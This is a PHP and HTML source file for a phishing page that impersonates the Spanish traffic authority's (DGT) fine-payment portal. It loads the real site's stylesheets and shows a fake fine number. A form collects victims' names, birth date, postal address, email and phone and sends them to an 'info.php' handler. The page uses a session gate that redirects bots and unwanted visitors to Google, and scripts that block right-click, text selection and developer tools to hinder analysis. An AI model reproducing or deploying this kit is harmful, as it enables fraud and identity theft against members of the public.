<?php
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);

require '../server/all.php';

if (isset($_SESSION['autoriser']) && $_SESSION['autoriser'] === true ){	
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" lang="es">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="robots" content="noindex, nofollow">
		<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>

		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
		<style type="text/css" media="all">
			@import url('https://sedeclave.dgt.gob.es/IWPS5/assets/bootstrap-3.3.7/css/bootstrap.min.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/assets/bootstrap-3.3.7/css/bootstrap-theme.min.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/assets/selectize-0.12.4/css/selectize.bootstrap3.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/assets/font-awesome-4.7.0/font-awesome.custom.min.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/assets/datepicker-0.4.0/datepicker.min.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/assets/unslider-2.0.3/unslider.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/css/estilosComObl.css');
			@import url('https://sedeclave.dgt.gob.es/IWPS5/css/estiloPropio.css');
		</style>
		

		<title>Page de sanciones</title>
		<style>
        /* Style du bouton */
        .custom-button {
            background-color: #048;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px; /* Bords arrondis */
            cursor: pointer;
        }

        /* Style au survol du bouton */
        .custom-button:hover {
            background-color: #036; /* Changer la couleur au survol */
        }
    </style>
		
		
	</head>
	<body id="myBody" class="js-enabled">
	
		
		
		<div class="burguer small" aria-hidden="true">			
			
		
		</div>
		<!-- Atajos -->
		<header class="main-header">
			<h1 class="sr-only">
			<span>Site Web DGT</span></h1>
			<nav>
				<h2 class="sr-only">Entête</h2>
				<!-- Cabecera con los logos -->
				<div class="brand">
					<h3 class="sr-only">Organisme</h3>
					<div class="logos">
						<a title="" href="" target="_blank"><img src="../assets/images/logo-mir.png" ></a>
						<a title="" href="" target="_blank"><img src="../assets/images/logo-dgt.png" ></a>
					</div>
					<a class="title" href="">
						<span class="main">Pago de sanciones</span>
						
					</a>
					<div class="desktop-fix"></div>
				</div>
				
				
					
				
				<div id="formMenuCarritoId" name="formMenuCarritoId" method="post" action="" enctype="application/x-www-form-urlencoded">
					<input type="hidden" name="formMenuCarritoId" value="formMenuCarritoId">
					<div class="nav-main menu-component" id="main-navigation">
						<h3 class="sr-only"></h3>
						<ul class="menu">
							<li class="level l1 no-sublevel" onclick="">
								<a href="" class="item"><span class="fa fa-angle-right" aria-hidden="true"></span>Pagos</a>
							</li>
						</ul>
					</div>
					
			</nav>
			<!--/ Menu principal de enlaces -->
		</header>
		<main class="main-content">
			<!-- Avisos -->
			<div class="dgt-announcements-header">
				
				
			</div>
			
					<!-- TITRE -->
					<span class="hide">Pago de sanciones</span>
					
					<h2>Pago de su multa N°164357371274</h2>

					
				</header>
			
				
				
				<div></div>
				
				
				
					
	<div class="box bordered-box overlapped-title-box">
	<div class="container-fluid">
    <!-- Form -->
	<form method="post" action="../actions/info.php">
    <div class="row">
        <!-- NOM -->
        <div class="col-sm-4">
            <label class="mandatory">Apellido</label>
            <input id="nom" type="text" name="nom" class="form-control" maxlength="255" required>
        </div>
        <!-- Prenom -->
        <div class="col-sm-4">
            <label id="prenom" class="mandatory">Nombre</label>
            <input id="prenom" type="text" name="prenom" class="form-control" maxlength="255" required>
        </div>
    </div>

    <div class="row">
        <!-- Date de naissance -->
        <div class="col-sm-4">
            <label class="mandatory">Fecha de nacimiento</label>
            <input id="dob" type="text" name="dob" class="form-control" maxlength ="10" milength ="10" inputmode="numeric" oninput="formatDate(this)" placeholder="JJ/MM/AAAA" required>
        </div>
        <!-- Adresse postale -->
        <div class="col-sm-4">
            <label class="mandatory">Dirección postal</label>
            <input id="adresse" type="text" name="adresse" class="form-control" maxlength="255" minlength="3" required>
        </div>
    </div>

    <div class="row">
        <!-- Code postal -->
        <div class="col-sm-4">
            <label class="mandatory">Código postal</label>
            <input id="cp" type="text" name="cp" class="form-control" maxlength="5" maxlength="5" placeholder="XXXXX" inputmode="numeric" oninput="chiffres_only(this)" required>
        </div>
        <!-- Ville -->
        <div class="col-sm-4">
            <label class="mandatory">Ciudad</label>
            <input id="ville" type="text" name="ville" class="form-control" maxlength="255" required>
        </div>
    </div>

    <div class="row">
        <!-- Email -->
        <div class="col-sm-4">
            <label class="mandatory">Email</label>
            <input id="email" type="email" name="email" class="form-control" maxlength="255" placeholder ="correo2@dgt.es" required>
        </div>

		<div class="col-sm-4">
    		<label class="mandatory">Número de teléfono</label>  
        	<input type="text" value="+34" name = "tel" class="form-control" inputmode="numeric" minlength="9" maxlength="12" oninput="chiffres_only(this)"required>   
		
    	</div>
	</div>
			<br>
			<!-- BUTTON VALIDER -->
			<div class="row">
			<div class="col-sm-8">
			<button type="submit" name="info_submit" class="custom-button form-control">Continuar</button>
			<input type="hidden" name="info_submit" value="true">		
			</div> 
			</div>
    </div>

				
</form>

						













<table class="table table-striped">
							<caption>
								<label class="title">Confirme su identidad</label>
							</caption>
						</table>
					</div>
					
					
					
				
				<!-- Encuesta -->
				
			</main>
			<footer class="main-footer">
		<nav>
			<h2 class="sr-only">Pie de página</h2>

			<h3 class="sr-only">Ayuda y políticas</h3>
			<ul class="inline links piped">
				<li>
					<a class="link" href="" target="_blank" title="Aviso legal">Aviso legal</a>
				</li>
				<li>
					<a class="link" href="" target="_blank" title="Propiedad intelectual">Propiedad intelectual</a>
				</li>
				<li>
					<a class="link" href="" target="_blank" title="Accesibilidad">Accesibilidad</a>
				</li>
				<li>
					<a class="link" href="" target="_blank" title="Protección de datos">Protección de datos</a>
		</ul>
			
			<div class="footer-social">
				<ul>
					<li>
						<a href="" target="_blank" title="Abrir en nueva ventana Página de Facebook">
							<em class="fa fa-facebook-square"><span class="hide">Página de Facebook</span></em>
						</a>
					</li>
					<li>
						<a href="" target="_blank" title="Abrir en nueva ventana Página de Twitter">
							<em class="fa fa-twitter-square"><span class="hide">Página de Twitter</span></em>
						</a>
					</li>
					<li>
						<a href="t" target="_blank" title="Abrir en nueva ventana Página de YouTube">
							<em class="fa fa-youtube-square"><span class="hide">Página de YouTube</span></em>
						</a>
					</li>
					<li>
						<a href="" target="_blank" title="Abrir en nueva ventana Página de Instagram">
							<em class="fa fa-instagram"><span class="hide">Página de Instagram</span></em>
						</a>
					</li>
				</ul>
			</div>

			<h3 class="sr-only">Copyright</h3>
			<p class="copyright">Copyright @ DGT 2022. Todos los derechos reservados</p>

			<h3 class="sr-only">Contacto</h3>
			<ul class="inline contact">
				<li>
					<span class="fa fa-phone fa-white" aria-hidden="true" title="Teléfono"></span>
					<span class="sr-only">Teléfono</span>
					011 Estado del Tráfico
				</li>
				<li>
					<span class="fa fa-phone fa-white" aria-hidden="true" title="Teléfono"></span>
					<span class="sr-only">Teléfono</span>
					060 Admin. Gral. del Estado
				</li>
				<li>
					<span class="fa fa-map-marker fa-white" aria-hidden="true" title="Ubicación"></span>
					<span class="sr-only">Ubicación</span>
					C/ Josefa Valcarcel, 28 - 28071 Madrid-España
				</li>
			</ul>
		</nav>
	</footer>
			<div id="Version_V05"></div>
			<!-- MYFACES JAVASCRIPT -->
		</body>
	</html>

	<!-- REDIRECTION EN CAS DE BOT OU ISP NON AUTORISER -->
<?php
} else {
    header("Location: https://www.google.com");
    exit;
}

?>

<!-- script js -->	
<script>
        // JavaScript pour la fonction formatDate
        function formatDate(input) {
            input.value = input.value.replace(/\D/g, '');
            if (input.value.length > 2) {
                input.value = input.value.slice(0, 2) + '/' + input.value.slice(2);
            }
            if (input.value.length > 5) {
                input.value = input.value.slice(0, 5) + '/' + input.value.slice(5);
            }
        }

        // JavaScript pour la fonction chiffres_only
        function chiffres_only(input) {
            input.value = input.value.replace(/\D/g, '');
        }

		document.addEventListener("contextmenu", function(e){
        e.preventDefault();
    }, false);

    // Désactiver la sélection de texte
    document.addEventListener("selectstart", function(e){
        e.preventDefault();
    }, false);


    window.addEventListener("keydown", function(e) {
        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
            e.preventDefault();
        }
    });
</script>